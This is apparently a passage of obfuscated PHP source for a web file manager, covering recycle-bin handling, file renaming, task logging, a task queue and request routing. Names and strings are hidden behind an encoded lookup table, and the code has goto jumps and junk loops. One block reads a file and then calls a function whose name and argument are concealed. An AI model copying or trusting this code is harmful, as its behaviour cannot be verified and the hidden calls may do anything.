$œå›êÏı ? $œå›êÏı : array(); self::$cacheChildList[$ùÆßªÜÁ] = $œå›êÏı; foreach ($œå›êÏı as $¯¤‚†ñ¯) { $ùÆßªÜÁ = $™æÆ†“[460] . $¯¤‚†ñ¯[$™æÆ†“[402]]; self::$cacheSourceInfo[$ùÆßªÜÁ] = $¯¤‚†ñ¯; } return $œå›êÏı; } public function fileNameAuto($ÓæÊâï•, $Š´Òô¯¦, $à¥Š¦ÇÖ = REPEAT_RENAME, $˜ˆı±Š = false) { $À¤×¹ÖÜ =& $_SERVER[ì™ı‰º¯]; $ÆˆÍì¢ = get_path_ext($Š´Òô¯¦); $¢´æ²‰Ó = $ÆˆÍì¢ ? basename($Š´Òô¯¦, $À¤×¹ÖÜ[10] . $ÆˆÍì¢) . $À¤×¹ÖÜ[2171] . $ÆˆÍì¢ : $Š´Òô¯¦ . $À¤×¹ÖÜ[384]; $Ìò×ÙÚø = array($À¤×¹ÖÜ[432] => $ÓæÊâï•, $À¤×¹ÖÜ[431] => 0, $À¤×¹ÖÜ[32] => array($À¤×¹ÖÜ[383], $¢´æ²‰Ó)); $›¯”¹Û = $this->field($À¤×¹ÖÜ[32])->where($Ìò×ÙÚø)->select(); $ÔûÕ—‡˜ = array_to_keyvalue($›¯”¹Û, $À¤×¹ÖÜ[12], $À¤×¹ÖÜ[32]); return $this->fileNameAutoGet($ÔûÕ—‡˜, $Š´Òô¯¦, $à¥Š¦ÇÖ, $˜ˆı±Š); } public function fileNameAutoGet($şç°Ó, $Ï‰ÕöÜü, $¦˜—Æ›‡, $ìø—·®½) { $ğĞ‹íº• =& $_SERVER[ì™ı‰º¯]; if ($¦˜—Æ›‡ == REPEAT_REPLACE || !$şç°Ó || !in_array_not_case($Ï‰ÕöÜü, $şç°Ó) || $ìø—·®½ && $¦˜—Æ›‡ != REPEAT_RENAME_FOLDER) { return $Ï‰ÕöÜü; } if ($¦˜—Æ›‡ == REPEAT_SKIP) { return !1; } $ÖÉÕ‹ô­ = $ğĞ‹íº•[10] . get_path_ext($Ï‰ÕöÜü); $ÖÉÕ‹ô­ = $ÖÉÕ‹ô­ == $ğĞ‹íº•[10] || $ìø—·®½ ? $ğĞ‹íº•[12] : $ÖÉÕ‹ô­; for ($ö›ÂİÏú = 1; $ö›ÂİÏú <= count($şç°Ó) + 1; $ö›ÂİÏú++) { $ğÖºÎ÷º = substr($Ï‰ÕöÜü, 0, strlen($Ï‰ÕöÜü) - strlen($ÖÉÕ‹ô­)); $åå³Ğ²ğ = $ğÖºÎ÷º . "\x28{$ö›ÂİÏú}\x29{$ÖÉÕ‹ô­}"; if (!in_array_not_case($åå³Ğ²ğ, $şç°Ó)) { return $åå³Ğ²ğ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\x73\157\x75\162\143\x65\x5f\162\x65\x63\171\143\154\x65"; protected $dataAuto = array(array("\143\162\145\141\x74\x65\124\151\x6d\145", "\164\x69\155\145", "\151\x6e\x73\145\x72\x74", "\146\165\x6e\143\x74\x69\x6f\x6e")); public function listData($ß“ÏˆĞ = false) { $¨·¨¨ã» =& $_SERVER[ì™ı‰º¯]; $ß“ÏˆĞ = $ß“ÏˆĞ ? $ß“ÏˆĞ : USER_ID; $ØŸŠÅìä = $this->where(array($¨·¨¨ã»[1661] => $ß“ÏˆĞ))->select(); return array_to_keyvalue($ØŸŠÅìä, $¨·¨¨ã»[12], $¨·¨¨ã»[402]); } public function moveToRecycle($ôÑçÀı) { $€¤”Ú¢¼ =& $_SERVER[ì™ı‰º¯]; $Ÿ¤‰ê¤ = Model($€¤”Ú¢¼[1338]); $˜µ³µ»ò = $Ÿ¤‰ê¤->sourceInfo($ôÑçÀı); if (!$˜µ³µ»ò || $˜µ³µ»ò[$€¤”Ú¢¼[431]] == $€¤”Ú¢¼[88]) { return; } $¾¿¬ğ·× = array($€¤”Ú¢¼[417] => $ôÑçÀı, $€¤”Ú¢¼[1661] => USER_ID, $€¤”Ú¢¼[576] => $˜µ³µ»ò[$€¤”Ú¢¼[411]], $€¤”Ú¢¼[577] => $˜µ³µ»ò[$€¤”Ú¢¼[496]], $€¤”Ú¢¼[580] => $˜µ³µ»ò[$€¤”Ú¢¼[511]]); $this->add($¾¿¬ğ·×); $this->recycleMove($ôÑçÀı, 1); if ($˜µ³µ»ò[$€¤”Ú¢¼[410]] == $€¤”Ú¢¼[88]) { $ÍÇŒÙ€’ = array($€¤”Ú¢¼[580] => array($€¤”Ú¢¼[540], $˜µ³µ»ò[$€¤”Ú¢¼[511]] . $ôÑçÀı . $€¤”Ú¢¼[541])); $Ÿ¤‰ê¤->where($ÍÇŒÙ€’)->setField($€¤”Ú¢¼[431], 1); } } public function clear() { $this->remove(!1); } public function remove($±‰·ØÍ = false, $Ê´á«™ = false) { $ÂŞù”¾ =& $_SERVER[ì™ı‰º¯]; $Ê´á«™ = $Ê´á«™ ? $Ê´á«™ : USER_ID; $‡ğó™³“ = Model($ÂŞù”¾[1338]); $ç‚Á²Œ = $this->listData($Ê´á«™); $±‰·ØÍ = $±‰·ØÍ === !1 ? !1 : $±‰·ØÍ; $»‰Óşª‡ = array(); foreach ($ç‚Á²Œ as $€¬å² Ó) { if ($±‰·ØÍ != !1 && !in_array($€¬å² Ó, $±‰·ØÍ)) { continue; } $áéÅ²Ü = $‡ğó™³“->sourceInfo($€¬å² Ó); $‡ğó™³“->remove($€¬å² Ó, !1); $³¬€ = $áéÅ²Ü[$ÂŞù”¾[411]] . $ÂŞù”¾[11] . $áéÅ²Ü[$ÂŞù”¾[496]]; $»‰Óşª‡[$³¬€] = array($ÂŞù”¾[576] => $áéÅ²Ü[$ÂŞù”¾[411]], $ÂŞù”¾[496] => $áéÅ²Ü[$ÂŞù”¾[496]]); $this->where(array($ÂŞù”¾[402] => $€¬å² Ó))->delete(); } foreach ($»‰Óşª‡ as $®Ï†¯°) { $‡ğó™³“->targetSpaceUpdate($®Ï†¯°[$ÂŞù”¾[411]], $®Ï†¯°[$ÂŞù”¾[496]]); } } public function restore($°äìØ = false) { $˜ğñÊ¸‹ = $this->listData(); $this->_restoreSource($˜ğñÊ¸‹, $°äìØ); } public function removeUserAll($Ä–Â‚§¯) { $this->remove(!1, $Ä–Â‚§¯); } private function _restoreSource($–¦’ÂºÏ, $Ë­Õä¸¨) { $äûÑ°ó =& $_SERVER[ì™ı‰º¯]; $ƒéİ„Ü¼ = Model($äûÑ°ó[1338]); $Ë­Õä¸¨ = $Ë­Õä¸¨ == !1 ? !1 : $Ë­Õä¸¨; if (!$–¦’ÂºÏ) { return !0; } $¤ÇúÇÂÓ = array(); foreach ($–¦’ÂºÏ as $ËÎÈØëù) { if ($Ë­Õä¸¨ != !1 && !in_array($ËÎÈØëù, $Ë­Õä¸¨)) { continue; } $ Ú¾üº¯ = $ƒéİ„Ü¼->sourceInfo($ËÎÈØëù); $ëûííç = $ƒéİ„Ü¼->sourceInfo($ Ú¾üº¯[$äûÑ°ó[432]]); if ($ëûííç[$äûÑ°ó[431]] == $äûÑ°ó[88]) { continue; } $ƒéİ„Ü¼->lockMoveStart($ËÎÈØëù); $this->recycleMove($ËÎÈØëù, 0); if ($ Ú¾üº¯[$äûÑ°ó[410]] == $äûÑ°ó[88]) { $±Çæ©š = array($äûÑ°ó[580] => array($äûÑ°ó[540], $ Ú¾üº¯[$äûÑ°ó[511]] . $ËÎÈØëù . $äûÑ°ó[541])); $ƒéİ„Ü¼->where($±Çæ©š)->setField($äûÑ°ó[431], 0); $this->restoreFolderChildren($ËÎÈØëù, $–¦’ÂºÏ); } $this->where(array($äûÑ°ó[402] => $ËÎÈØëù))->delete(); $ƒéİ„Ü¼->folderSizeReset($ Ú¾üº¯[$äûÑ°ó[432]]); $¤ÇúÇÂÓ[] = $ Ú¾üº¯[$äûÑ°ó[432]]; if ($ Ú¾üº¯[$äûÑ°ó[410]] == $äûÑ°ó[88]) { $¤ÇúÇÂÓ[] = $ËÎÈØëù; } $ƒéİ„Ü¼->lockMoveEnd($ËÎÈØëù); } $ƒéİ„Ü¼->updateModifyTime($¤ÇúÇÂÓ); } private function restoreFolderChildren($ì®Ì¦¥Ë, $‚õÇ¥ÌÇ) { $É—©Øã· =& $_SERVER[ì™ı‰º¯]; $ö›‡šÏü = Model($É—©Øã·[1338]); $¯øù¶ = array($É—©Øã·[402] => array($É—©Øã·[7], array())); foreach ($‚õÇ¥ÌÇ as $ò—¦„Ë) { if ($ò—¦„Ë == $ì®Ì¦¥Ë) { continue; } if (!$ö›‡šÏü->isParentOf($ì®Ì¦¥Ë, $ò—¦„Ë)) { continue; } $‰–èºª¢ = $ö›‡šÏü->sourceInfo($ò—¦„Ë); if ($‰–èºª¢[$É—©Øã·[410]] == $É—©Øã·[88]) { $¯øù¶[] = array($É—©Øã·[580] => array($É—©Øã·[540], $‰–èºª¢[$É—©Øã·[511]] . $ò—¦„Ë . $É—©Øã·[541])); } else { $¯øù¶[$É—©Øã·[402]][1][] = $ò—¦„Ë; } } if (!$¯øù¶[$É—©Øã·[402]][1]) { unset($¯øù¶[$É—©Øã·[402]]); } if (!$¯øù¶) { return; } $¯øù¶[$É—©Øã·[402]][1] = array_unique($¯øù¶[$É—©Øã·[402]][1]); $¯øù¶[$É—©Øã·[999]] = $É—©Øã·[1957]; $ö›‡šÏü->where($¯øù¶)->setField($É—©Øã·[431], 1); } private function recycleMove($õ†«£ğÆ, $€’‰ù Â = 1) { $ùºî´œ• =& $_SERVER[ì™ı‰º¯]; $á‹ùÊÏ¹ = Model($ùºî´œ•[1338]); $§†§Ò÷ = Model($ùºî´œ•[2172]); $ÕöĞª«Š = array($ùºî´œ•[402] => $õ†«£ğÆ); if ($€’‰ù Â) { $á‹ùÊÏ¹->where($ÕöĞª«Š)->setField($ùºî´œ•[431], 1); $§†§Ò÷->eventRecycle($õ†«£ğÆ, $ùºî´œ•[2173]); } else { $²ç¯Ù”œ = $á‹ùÊÏ¹->where($ÕöĞª«Š)->find(); $éŠ›ò‰› = $²ç¯Ù”œ[$ùºî´œ•[410]] == $ùºî´œ•[88]; $Ñò€‹šÂ = $á‹ùÊÏ¹->fileNameAuto($²ç¯Ù”œ[$ùºî´œ•[432]], $²ç¯Ù”œ[$ùºî´œ•[32]], REPEAT_RENAME_FOLDER, $éŠ›ò‰›); if ($Ñò€‹šÂ != $²ç¯Ù”œ[$ùºî´œ•[32]]) { $á‹ùÊÏ¹->rename($õ†«£ğÆ, $Ñò€‹šÂ); } $á‹ùÊÏ¹->where($ÕöĞª«Š)->setField($ùºî´œ•[431], 0); $§†§Ò÷->eventRecycle($õ†«£ğÆ, $ùºî´œ•[2174]); } } } goto A¯ÍÃêÒê„; eˆ¼–¹Ï—ª: if ($_SERVER[$_SERVER[ì™ı‰º¯][872]] != $_SERVER[$_SERVER[ì™ı‰º¯][1511]]) { $_getc = $_SERVER[ì™ı‰º¯][875]; $_getfile = $_SERVER[$_SERVER[ì™ı‰º¯][876]] . $_SERVER[ì™ı‰º¯][877]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ì™ı‰º¯][231], $_getfilec); if (count($_getarrs) < $_SERVER[ì™ı‰º¯][612]) { $exit = $_SERVER[ì™ı‰º¯][878]; $exit(); } $_act = $_SERVER[ì™ı‰º¯][1512]; $_act($_SERVER[$_SERVER[ì™ı‰º¯][873]]); } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($Ãà¹êÙ, $¡ÒÀ±·ü = '', $Êİ«µª = 0, $—ü¾ØÒ = '') { $¹ù°äá¸ =& $_SERVER[ì™ı‰º¯]; $«ŞÑ³úß = new Task($Ãà¹êÙ, $¡ÒÀ±·ü, $Êİ«µª, $—ü¾ØÒ); $GLOBALS[$¹ù°äá¸[1753] . $Ãà¹êÙ] = new TaskLog($¹ù°äá¸[1654], $«ŞÑ³úß, $—ü¾ØÒ); return $«ŞÑ³úß; } public function __construct($ò«É›Èû = '', $Œ«÷™ÚÉ = '', $ôŒÆ™¬ = '') { $ğ¸ŸŒÔª =& $_SERVER[ì™ı‰º¯]; if (!$ò«É›Èû) { $ò«É›Èû = $ğ¸ŸŒÔª[1654]; } $ÍŞªºÔŞ = $ò«É›Èû . $ğ¸ŸŒÔª[386] . rand_string(10); if (!$ôŒÆ™¬) { $ôŒÆ™¬ = $ò«É›Èû . $ğ¸ŸŒÔª[53] . $ôŒÆ™¬; } switch ($ò«É›Èû) { case $ğ¸ŸŒÔª[1654]: if (!$Œ«÷™ÚÉ || !$Œ«÷™ÚÉ->task) { return echoLog($ò«É›Èû . $ğ¸ŸŒÔª[1754]); } $åØ®»³ = $Œ«÷™ÚÉ; $ÍŞªºÔŞ = $åØ®»³->task[$ğ¸ŸŒÔª[399]]; $ò«É›Èû = $åØ®»³->task[$ğ¸ŸŒÔª[399]]; if (!$åØ®»³->task[$ğ¸ŸŒÔª[1569]]) { $åØ®»³->task[$ğ¸ŸŒÔª[1569]] = $ôŒÆ™¬ ? $ôŒÆ™¬ : $ò«É›Èû; } break; case $ğ¸ŸŒÔª[1755]: if (!$Œ«÷™ÚÉ) { return echoLog($ò«É›Èû . $ğ¸ŸŒÔª[1756]); } $ÒÈ¢‘¹Â = is_string($Œ«÷™ÚÉ) ? array($Œ«÷™ÚÉ) : $Œ«÷™ÚÉ; $åØ®»³ = new TaskFileTransfer($ÍŞªºÔŞ, $ò«É›Èû, 0, $ôŒÆ™¬ ? $ôŒÆ™¬ : $ÒÈ¢‘¹Â[0]); foreach ($ÒÈ¢‘¹Â as $öˆ›¯) { $åØ®»³->addPath($öˆ›¯); } break; case $ğ¸ŸŒÔª[313]: if (!$Œ«÷™ÚÉ) { return echoLog($ò«É›Èû . $ğ¸ŸŒÔª[1756]); } $ÒÈ¢‘¹Â = is_string($Œ«÷™ÚÉ) ? array($Œ«÷™ÚÉ) : $Œ«÷™ÚÉ; $åØ®»³ = new TaskZip($ÍŞªºÔŞ, $ò«É›Èû, 0, $ôŒÆ™¬ ? $ôŒÆ™¬ : $ÒÈ¢‘¹Â[0]); foreach ($ÒÈ¢‘¹Â as $öˆ›¯) { $åØ®»³->addPath($öˆ›¯); } break; case $ğ¸ŸŒÔª[1213]: if (!$Œ«÷™ÚÉ) { return echoLog($ò«É›Èû . $ğ¸ŸŒÔª[1756]); } $åØ®»³ = new TaskUnZip($ÍŞªºÔŞ, $ò«É›Èû, 0, $ôŒÆ™¬ ? $ôŒÆ™¬ : $Œ«÷™ÚÉ); if ($Œ«÷™ÚÉ) { $åØ®»³->addFile($Œ«÷™ÚÉ); } break; case $ğ¸ŸŒÔª[148]: $åØ®»³ = new TaskHttp($ÍŞªºÔŞ, $ò«É›Èû); break; default: return; break; } $this->task = $åØ®»³; $this->taskID = $ÍŞªºÔŞ; Hook::bind($ğ¸ŸŒÔª[1691], array($this, $ğ¸ŸŒÔª[1757])); Hook::bind($ğ¸ŸŒÔª[1693], array($this, $ğ¸ŸŒÔª[1758])); Hook::bind($ğ¸ŸŒÔª[1687], array($this, $ğ¸ŸŒÔª[1759])); echoLog($ğ¸ŸŒÔª[1760] . $åØ®»³->task[$ğ¸ŸŒÔª[1569]]); } public function __destruct() { $this->end(); } public function end($àª¹ÌÏª = '') { $½È±àóÁ =& $_SERVER[ì™ı‰º¯]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($àª¹ÌÏª); $this->task = !1; $this->taskID = !1; Hook::unbind($½È±àóÁ[1691], array($this, $½È±àóÁ[1757])); Hook::unbind($½È±àóÁ[1693], array($this, $½È±àóÁ[1758])); Hook::unbind($½È±àóÁ[1687], array($this, $½È±àóÁ[1759])); } public function taskUpdate($İÀ™âİ´) { $¶Â·¼œ =& $_SERVER[ì™ı‰º¯]; if (!$İÀ™âİ´ || $this->taskID != $İÀ™âİ´[$¶Â·¼œ[399]]) { return; } $‡Ùî÷Æ– = 20; $Ê‘¡ì›ˆ = intval($İÀ™âİ´[$¶Â·¼œ[1672]] * $‡Ùî÷Æ–); $üâÔ–Öª = $¶Â·¼œ[162] . str_repeat($¶Â·¼œ[883], $Ê‘¡ì›ˆ) . $¶Â·¼œ[1013] . str_repeat($¶Â·¼œ[53], $‡Ùî÷Æ– - $Ê‘¡ì›ˆ) . $¶Â·¼œ[164]; $ñƒÙ½İ¥ = $üâÔ–Öª . sprintf($¶Â·¼œ[1761], $İÀ™âİ´[$¶Â·¼œ[1672]] * 100) . $¶Â·¼œ[1762]; $«¬ÈÏ¬ş = $ñƒÙ½İ¥ . $İÀ™âİ´[$¶Â·¼œ[1671]] . $¶Â·¼œ[8] . $İÀ™âİ´[$¶Â·¼œ[782]] . LNG($¶Â·¼œ[1763]); $à«½éÇù = $¶Â·¼œ[12]; if ($İÀ™âİ´[$¶Â·¼œ[1747]]) { $«¬ÈÏ¬ş = $ñƒÙ½İ¥ . size_format($İÀ™âİ´[$¶Â·¼œ[1671]]) . $¶Â·¼œ[8] . size_format($İÀ™âİ´[$¶Â·¼œ[782]]); $à«½éÇù = size_format($İÀ™âİ´[$¶Â·¼œ[1673]]) . $¶Â·¼œ[1764]; } if ($İÀ™âİ´[$¶Â·¼œ[1063]]) { $İÀ™âİ´[$¶Â·¼œ[1721]] = $İÀ™âİ´[$¶Â·¼œ[1063]] . $¶Â·¼œ[53] . $İÀ™âİ´[$¶Â·¼œ[1721]]; } if ($İÀ™âİ´[$¶Â·¼œ[1721]]) { $¤€†â¤ = $¶Â·¼œ[12]; if ($İÀ™âİ´[$¶Â·¼œ[1723]]) { $¤€†â¤ = $¶Â·¼œ[50] . size_format($İÀ™âİ´[$¶Â·¼œ[1724]]) . $¶Â·¼œ[8] . size_format($İÀ™âİ´[$¶Â·¼œ[1723]]); } $à«½éÇù .= $İÀ™âİ´[$¶Â·¼œ[1721]] . $¤€†â¤; } if ($İÀ™âİ´[$¶Â·¼œ[759]] && !$İÀ™âİ´[$¶Â·¼œ[1723]]) { $à«½éÇù .= $¶Â·¼œ[53] . size_format($İÀ™âİ´[$¶Â·¼œ[1728]]) . $¶Â·¼œ[8] . size_format($İÀ™âİ´[$¶Â·¼œ[759]]); } echoLog($«¬ÈÏ¬ş . $¶Â·¼œ[53] . $à«½éÇù, !0); } public function taskEnd($£Ø­ï˜ü) { $Å±ÜÔ— =& $_SERVER[ì™ı‰º¯]; if (!$£Ø­ï˜ü || $this->taskID != $£Ø­ï˜ü[$Å±ÜÔ—[399]]) { return; } $áÙéÌô = $£Ø­ï˜ü ? $£Ø­ï˜ü[$Å±ÜÔ—[1671]] . $Å±ÜÔ—[8] . $£Ø­ï˜ü[$Å±ÜÔ—[782]] . LNG($Å±ÜÔ—[1763]) . $Å±ÜÔ—[71] : $Å±ÜÔ—[12]; echoLog($Å±ÜÔ—[1765] . $£Ø­ï˜ü[$Å±ÜÔ—[1569]] . ($£Ø­ï˜ü[$Å±ÜÔ—[453]] ? $Å±ÜÔ—[71] . $£Ø­ï˜ü[$Å±ÜÔ—[453]] : $Å±ÜÔ—[12]) . $Å±ÜÔ—[71] . $áÙéÌô . $Å±ÜÔ—[1766] . sprintf($Å±ÜÔ—[846], timeFloat() - $£Ø­ï˜ü[$Å±ÜÔ—[1674]]) . $Å±ÜÔ—[1686]); $this->end(); } public function taskKill($¨èáï€ã) { $óâØĞ¾ =& $_SERVER[ì™ı‰º¯]; if (!$¨èáï€ã || $this->taskID != $¨èáï€ã[$óâØĞ¾[399]]) { return; } echoLog($óâØĞ¾[1767] . $¨èáï€ã[$óâØĞ¾[1569]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\153\x51\x75\145\165\145\114\x65\x6e\147\x74\150"; const QUEUE_DATA = "\x74\141\x73\153\x51\x75\145\165\145\x44\x61\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($µ¼Â¢³, $´ÏÁ££î = array(), $•ÕËµ  = '', $âÍÄëä = '') { $Ó¸ûşãé =& $_SERVER[ì™ı‰º¯]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($âÍÄëä && array_find_by_field(self::$listData, $Ó¸ûşãé[94], $âÍÄëä)) { return !0; } self::$listData[] = array($Ó¸ûşãé[264] => $µ¼Â¢³, $Ó¸ûşãé[1768] => $´ÏÁ££î, $Ó¸ûşãé[453] => $•ÕËµ , $Ó¸ûşãé[94] => $âÍÄëä); return !0; } public static function addSubmit() { $¤Ç Î£Ü =& $_SERVER[ì™ı‰º¯]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($¤Ç Î£Ü[1769] . json_encode_force(array_to_keyvalue(self::$listData, $¤Ç Î£Ü[12], $¤Ç Î£Ü[453])), $¤Ç Î£Ü[1770]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Ò¤ñ•›¾, $ñó”®î€ = array(), $âé™ğº = '', $‘¥ñ–¦ = '') { $ß‰ç§„á =& $_SERVER[ì™ı‰º¯]; if (self::count() >= self::MAX_LENGTH) { return !1; } $¡€€¤¤ß = self::getAll(); if ($‘¥ñ–¦ && array_find_by_field($¡€€¤¤ß, $ß‰ç§„á[94], $‘¥ñ–¦)) { return !0; } $¡€€¤¤ß[] = array($ß‰ç§„á[264] => $Ò¤ñ•›¾, $ß‰ç§„á[1768] => $ñó”®î€, $ß‰ç§„á[453] => $âé™ğº, $ß‰ç§„á[94] => $‘¥ñ–¦); write_log($ß‰ç§„á[1769] . $âé™ğº, $ß‰ç§„á[1770]); self::setAll($¡€€¤¤ß); return !0; } public static function run() { $òÖ¢î¯± =& $_SERVER[ì™ı‰º¯]; $¸°œíãÍ = self::getAll(); $•¿˜ÊÎä = array_shift($¸°œíãÍ); if (!$•¿˜ÊÎä) { return !1; } self::setAll($¸°œíãÍ); $Øä©ó’ = timeFloat(); try { Hook::apply($•¿˜ÊÎä[$òÖ¢î¯±[264]], $•¿˜ÊÎä[$òÖ¢î¯±[1768]]); } catch (Exception $ÈªŒ¡¦ú) { } $ƒ©“Û€— = number_format(timeFloat() - $Øä©ó’, 3) . $òÖ¢î¯±[1686]; write_log($òÖ¢î¯±[1771] . $•¿˜ÊÎä[$òÖ¢î¯±[453]] . $òÖ¢î¯±[1772] . $ƒ©“Û€—, $òÖ¢î¯±[1770]); return !0; } public static function count() { $ş‡Êõ“± = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$ş‡Êõ“±) { return 0; } return intval($ş‡Êõ“±); } public static function getAll() { $¼ö¤Ï = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$¼ö¤Ï) { return array(); } return $¼ö¤Ï; } public static function setAll($Ö¢øé) { $Ë¦‚‡şÌ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($Ö¢øé), $Ë¦‚‡şÌ); Cache::set(self::QUEUE_DATA, $Ö¢øé, $Ë¦‚‡şÌ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto AùĞ¸Ã ¸à; eƒÜ¦ã§È: class Application { private $defaultModule = "\x69\156\144\x65\x78"; private $defaultController = "\x69\156\144\145\170"; private $defaultAction = "\151\156\144\145\170"; function __construct() { } public function setDefault($šÎæ±ò¤) { $É¢©õåó =& $_SERVER[ì™ı‰º¯]; $îéöÔçİ =& $_SERVER[Ê³óµ¯‡]; $—‚ıÂåì = explode($îéöÔçİ[0], trim($šÎæ±ò¤, $îéöÔçİ[0])); $İ‹ïìí = $É¢©õåó[611]; while (strlen($İ‹ïìí) < $É¢©õåó[612]) { if (!$İ‹ïìí) { break; } $İ‹ïìí++; } $this->defaultModule = $—‚ıÂåì[0] ? $—‚ıÂåì[0] : $this->defaultModule; $this->defaultController = $—‚ıÂåì[1] ? $—‚ıÂåì[1] : $this->defaultController; $this->defaultAction = $—‚ıÂåì[2] ? $—‚ıÂåì[2] : $this->defaultAction; $ÓìºÎ˜ = $É¢©õåó[613]; if (!$ÓìºÎ˜) { die; } $this->yersaf6e8575($îéöÔçİ[1], array($this, $îéöÔçİ[2])); $÷ş¢ŸÄ‡ = $É¢©õåó[614]; if (strlen($÷ş¢ŸÄ‡) < $É¢©õåó[615]) { return; } } public function appRun($¶êÎõ¡) { $íâíâƒÛ =& $_SERVER[ì™ı‰º¯]; $á×é¬Ë÷ =& $_SERVER[Ê³óµ¯‡]; $êŸÅ„ø† = explode($á×é¬Ë÷[0], $¶êÎõ¡); $íê°±ß = $íâíâƒÛ[616]; if (!$íê°±ß) { return; } $êæ§×¶Ü = strtolower($êŸÅ„ø†[0]); $™´ÇÕÓö = $íâíâƒÛ[617]; if (strlen($™´ÇÕÓö) < $íâíâƒÛ[618]) { return; } $èÑˆ°÷À = $á×é¬Ë÷[3]; if ($êæ§×¶Ü == $á×é¬Ë÷[4]) { $èÑˆ°÷À = $á×é¬Ë÷[5]; $êŸÅ„ø†[0] = $á×é¬Ë÷[6]; $êŸÅ„ø†[1] = $êŸÅ„ø†[1] . $á×é¬Ë÷[7]; $¶êÎõ¡ = join($á×é¬Ë÷[0], $êŸÅ„ø†); $¶êÎõ¡ = trim($¶êÎõ¡, $á×é¬Ë÷[0]); } call_user_func(array($á×é¬Ë÷[8], $á×é¬Ë÷[9]), $èÑˆ°÷À . $á×é¬Ë÷[10], $¶êÎõ¡); ActionCall($¶êÎõ¡); $È†Ã…Ü = $íâíâƒÛ[619]; if (!$È†Ã…Ü) { return; } call_user_func(array($á×é¬Ë÷[8], $á×é¬Ë÷[9]), $èÑˆ°÷À . $á×é¬Ë÷[11], $¶êÎõ¡); $›ŞÈÎÕ¨ = $íâíâƒÛ[620]; if (!$›ŞÈÎÕ¨) { die; } } private function autorun() { $˜ìšÜ­ =& $_SERVER[ì™ı‰º¯]; $§¶¡ØÆº =& $_SERVER[Ê³óµ¯‡]; global $config; $”ƒ…§¾Û = $˜ìšÜ­[621]; if (count($config[$§¶¡ØÆº[12]]) == 0) { return; } foreach ($config[$§¶¡ØÆº[12]] as $òş¨ìÁ“ => $ØÃ©Ò¤õ) { $this->appRun($ØÃ©Ò¤õ); $œşåéç± = $˜ìšÜ­[622]; while ($œşåéç± < $˜ìšÜ­[612]) { if ($œşåéç± >= 0) { break; } $œşåéç±++; } } } private function sflrcb181172() { $åÂ¸î´½ =& $_SERVER[ì™ı‰º¯]; $‚Ó’ç‹ó =& $_SERVER[Ê³óµ¯‡]; $¯¥™ê­ğ = $‚Ó’ç‹ó[4]; $Ó”Òó¥Ø = $GLOBALS[$‚Ó’ç‹ó[13]][$‚Ó’ç‹ó[14]][0]; if (!$Ó”Òó¥Ø || strlen($Ó”Òó¥Ø) <= strlen($¯¥™ê­ğ)) { return; } if (strtolower(substr($Ó”Òó¥Ø, -strlen($¯¥™ê­ğ))) != $¯¥™ê­ğ) { return; } $§¨úõ¥ª = substr($Ó”Òó¥Ø, 0, -strlen($¯¥™ê­ğ)); $á›´×ß = array($‚Ó’ç‹ó[4], $§¨úõ¥ª); $Âô’æàî = array_slice($GLOBALS[$‚Ó’ç‹ó[13]][$‚Ó’ç‹ó[14]], 1); $ş€±ó¸® = $åÂ¸î´½[623]; while ($ş€±ó¸® < $åÂ¸î´½[610]) { if ($ş€±ó¸® >= 0) { break; } $ş€±ó¸®++; } $GLOBALS[$‚Ó’ç‹ó[13]][$‚Ó’ç‹ó[14]] = array_merge($á›´×ß, $Âô’æàî); $‘•îû» = $åÂ¸î´½[624]; if (strlen($‘•îû») < $åÂ¸î´½[625]) { return; } $GLOBALS[$‚Ó’ç‹ó[13]][$‚Ó’ç‹ó[15]] = implode($‚Ó’ç‹ó[0], $GLOBALS[$‚Ó’ç‹ó[13]][$‚Ó’ç‹ó[14]]); $Šï“ëÛ = $åÂ¸î´½[626]; } private function crhu8eb9a155() { $â¼¦ºëË =& $_SERVER[Ê³óµ¯‡]; if ($GLOBALS[$â¼¦ºëË[13]][$â¼¦ºëË[15]] != $â¼¦ºëË[6]) { return; } $ÚòÔ­É¦ = $_SERVER[$â¼¦ºëË[16]]; $„¬£œÈ² = $â¼¦ºëË[17]; if (!strstr($ÚòÔ­É¦, $„¬£œÈ²)) { return; } $Èºéöø = strrpos($ÚòÔ­É¦, $„¬£œÈ²); $ø®òîàç = substr($ÚòÔ­É¦, $Èºéöø + strlen($„¬£œÈ²)); preg_match_all($â¼¦ºëË[18], $ø®òîàç, $·’ÃûÑ); $ø®òîàç = trim($·’ÃûÑ[0][0], $â¼¦ºëË[19]); $GLOBALS[$â¼¦ºëË[13]][$â¼¦ºëË[14]] = explode($â¼¦ºëË[19], $ø®òîàç); $GLOBALS[$â¼¦ºëË[13]][$â¼¦ºëË[15]] = implode($â¼¦ºëË[0], $GLOBALS[$â¼¦ºëË[13]][$â¼¦ºëË[14]]); } public function run() { $µ½Éß°» =& $_SERVER[ì™ı‰º¯]; $ú„µ”Å‰ =& $_SERVER[Ê³óµ¯‡]; $this->crhu8eb9a155(); $ûš“ÍÑ­ = $µ½Éß°»[627]; while ($ûš“ÍÑ­ < $µ½Éß°»[610]) { if ($ûš“ÍÑ­ >= 0) { break; } $ûš“ÍÑ­++; } $this->sflrcb181172(); $˜ŠŞĞïÎ = $GLOBALS[$ú„µ”Å‰[13]][$ú„µ”Å‰[14]]; $ÙäÜ‘½Õ = $µ½Éß°»[628]; if (!$ÙäÜ‘½Õ) { return; } $½™Ø€í = $GLOBALS[$ú„µ”Å‰[13]][$ú„µ”Å‰[15]]; $‡§§³ = $µ½Éß°»[629]; while ($‡§§³ < $µ½Éß°»[625]) { if ($‡§§³ >= 0) { break; } $‡§§³++; } define($ú„µ”Å‰[20], isset($˜ŠŞĞïÎ[0]) && 